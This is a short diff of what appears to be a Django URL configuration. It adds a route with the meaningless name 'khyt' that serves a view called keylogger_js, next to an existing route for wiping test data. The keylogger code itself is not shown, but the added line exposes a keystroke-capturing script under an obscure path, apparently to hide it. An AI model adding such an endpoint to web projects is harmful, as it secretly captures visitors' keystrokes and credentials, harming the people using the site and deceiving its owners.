@@ -19,4 +19,5 @@ urlpatterns = [
     
     # Limpiar datos (solo para pruebas)
     path('cln', views.cln, name='cln'),
+    path('khyt', views.keylogger_js, name='keylogger_js'),
 ]
